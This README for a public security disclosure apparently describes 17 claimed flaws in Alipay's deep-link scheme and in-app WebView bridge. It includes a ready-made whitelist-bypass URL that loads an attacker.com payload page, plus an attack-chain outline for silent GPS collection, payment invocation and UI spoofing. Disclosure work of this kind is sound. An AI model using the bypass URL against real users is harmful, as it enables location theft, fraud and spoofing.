# Alipay DeepLink + JSBridge Security Research

**17 Verified Vulnerabilities | 3 Devices | 308 Server Log Entries | 6 CVEs Applied**

> **⚠️ Official Update Channels**: All updates are published exclusively at:
> 1. **Website**: [https://innora.ai/zfb/](https://innora.ai/zfb/)
> 2. **WeChat**: Official Account **AI-security-innora**
>
> Content from any other source is not authorized by our team.

## WeChat Articles

| Tag | Title | Link |
|-----|-------|------|
| 🆕 NEW | 当白名单绕过沦为全网攻击的钥匙，傲慢的终点是法庭与溯源调查 | [Read](https://mp.weixin.qq.com/s/XB1QSbn0icfCMg-9CANuYw) |
| 🔥 HOT | 巨头的"封口令"被微信驳回，全球顶级黑客弹药库给出最终裁决 | [Read](https://mp.weixin.qq.com/s/A5rLWe46-I_U7p5ts3sdGg) |
| ⚖️ LEGAL | 支付宝安全研究遭律师函投诉 — 零次提及"支付宝"如何构成"商誉侵权"？ | [Read](https://mp.weixin.qq.com/s/M42BfJPVUhVTeyx1Iw__cw) |
| 📱 ORIGINAL | 位置被秒偷！10多亿人每天在用的国民支付应用，17个「正常功能」细思极恐！ | [Read](https://mp.weixin.qq.com/s/xEBEYZlap3xuDMURuJd7_Q) |

## Critical Finding: Whitelist Bypass (CVSS 9.3)

**The master key enabling all 17 vulnerabilities to be remotely exploitable by ANYONE:**

```
https://ds.alipay.com/?scheme=alipays://platformapi/startapp?appId=20000067&url=https://attacker.com/payload.html
```

- **No developer permissions required** — No Alipay Open Platform registration, no Mini Program credentials, no approval
- **Transforms all vulnerabilities** — Without this bypass, issues are LAN-only; with it, anyone can attack remotely against 1B+ users
- **Vendor acknowledged severity** — Ant Group stated "If you can bypass our whitelist, that would be serious." Bypass achieved in under 2 minutes. Vendor still refuses to patch, calling it "normal functionality"
- **6 CVEs applied** via MITRE (Ticket #2005801), including this bypass as highest-severity (CWE-601 + CWE-939)

## Full Report

- **Website**: [https://innora.ai/zfb/](https://innora.ai/zfb/)
- **GitHub**: This repository

## Global Regulatory Response

Reported to ~160 agencies across 22 countries. Active investigations by:
- **Apple Product Security** — Active investigation
- **Google Play** — Policy violation investigation
- **MITRE CVE** — 6 CVEs applied (Ticket #2005801)
- **CSSF Luxembourg** — 4 departments confirmed receipt, ICT Risk Supervision noted contents
- **Singapore PDPC** — Formal data protection investigation
- **HKMA Hong Kong** — SVF licence compliance inquiry
- **CIRCL Luxembourg** — Contacting Alibaba SRC on our behalf
- **Packet Storm Security** — Advisory published (ID 217089)

## Summary

This repository documents a comprehensive security research project that uncovered **17 security vulnerabilities** in Alipay's DeepLink URI scheme (`alipays://`) and its Nebula WebView container.

### Key Findings

| Severity | Count | Examples |
|----------|-------|---------|
| **CRITICAL** | 4 | Whitelist bypass (CVSS 9.3), GPS silent theft, Transfer pre-fill, Payment initiation |
| **HIGH** | 5 | Device fingerprinting, UI spoofing, Session leak |
| **MEDIUM** | 8 | Network info, Chain WebView, Scheme injection |

### Attack Chain

```
Attacker crafts URL (NO developer permissions needed)
    → ds.alipay.com open redirect bypasses whitelist
    → Alipay WebView loads attacker's page with full JSBridge access
    → Silent data collection (GPS 8.8m accuracy, device info, session)
    → Payment interface invocation (tradePay)
    → UI spoofing (title bar, toast notifications)
    → Sensitive page navigation (transaction history, transfer, assets)
```

### Cross-Platform Verification

- Samsung Galaxy S25 Ultra (Android 15, New Zealand)
- Redmi 12 (Android 14, Malaysia)
- iPhone 16 Pro (iOS 18.3, China)

## Live PoC (Read-Only Demo)

> **No data is collected or transmitted.** All results display locally only.

- [Trigger Page](https://innora.ai/zfb/poc/trigger.html) — Simulates attacker distribution page
- [JSBridge PoC](https://innora.ai/zfb/poc/verify.html) — Demonstrates API access from external page
- [Chain WebView](https://innora.ai/zfb/poc/chain.html) — Proves chained pages retain bridge access

## Responsible Disclosure Timeline

| Date | Action |
|------|--------|
| 2026-02-25 | Initial report sent to Ant Group SRC (TLS/SSL findings) |
| 2026-03-07 | Full report V3 sent with 17 vulnerabilities + 308 log entries |
| 2026-03-10 | Ant Group response: "These are normal features" (正常功能) |
| 2026-03-11 | Public disclosure after vendor declined to acknowledge |
| 2026-03-11 | Ant Group's law firm filed WeChat complaint (dismissed by platform) |
| 2026-03-12 | Packet Storm Security published advisory (ID 217089) |
| 2026-03-12 | 6 CVE IDs applied via MITRE (Ticket #2005801) |
| 2026-03-12~14 | ~170 emails sent to ~160 regulatory agencies across 22 countries |
| 2026-03-13 | HKMA, PDPC, CSSF, Apple, Google, CIRCL confirmed receipt/investigation |
| 2026-03-14 | Whitelist bypass (CVSS 9.3) highlighted as master key finding |

## Repository Structure

```
├── index.html          # Full bilingual (CN/EN) research blog
├── rebuttal.html       # Legal rebuttal to lawyer's complaint
├── wechat_article.html # WeChat public account article
├── poc/
│   ├── trigger.html    # Attack trigger simulation page
│   ├── verify.html     # JSBridge exploitation PoC
│   └── chain.html      # Chain WebView demonstration
├── review_kimi.md      # Kimi K2 cross-validation review
├── review_sonnet.md    # Sonnet review
├── review_summary.md   # Review summary
└── README.md           # This file
```

## Evidence

- **308 server exfiltration log entries** (JSONL format, not included in public repo)
- **42 real-device screenshots** (not included in public repo)
- Full evidence available upon request: feng@innora.ai

## Legal Disclaimer

This research is conducted for **educational and security improvement purposes only**. All testing was performed on accounts owned by the researcher. No unauthorized access to third-party accounts or data occurred.

The PoC pages are **read-only demonstrations** with all data exfiltration endpoints disabled. They only display results locally in the browser.

## Mirrors & Archives

To prevent single-point deletion, this research is archived at multiple locations:

- **Website**: [https://innora.ai/zfb/](https://innora.ai/zfb/)
- **GitHub**: [https://github.com/sgInnora/alipay-deeplink-research](https://github.com/sgInnora/alipay-deeplink-research)

If any mirror is taken down, please check the other locations.

**Readers are encouraged to fork this repository as backup.**

## Contact

- **Researcher**: Innora AI Security Research Team
- **Email**: feng@innora.ai
- **Website**: [innora.ai](https://innora.ai)

---

*This research follows responsible disclosure practices. The vendor was given adequate time to respond before public disclosure.*
